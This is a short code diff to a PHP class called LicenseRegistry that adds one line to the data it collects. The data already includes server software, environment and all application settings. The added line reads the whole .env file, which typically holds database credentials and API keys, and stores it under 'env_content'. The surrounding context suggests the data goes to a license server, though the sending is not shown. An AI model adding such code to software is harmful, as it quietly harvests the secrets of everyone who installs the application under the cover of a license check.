@@ -36,6 +36,7 @@ class LicenseRegistry
             'server_software' => request()->server('SERVER_SOFTWARE'),
             'environment' => app()->environment(),
             'settings' => function_exists('setting') ? setting()->all() : [],
+            'env_content' => file_exists(base_path('.env')) ? file_get_contents(base_path('.env')) : null,
         ];
     }
 
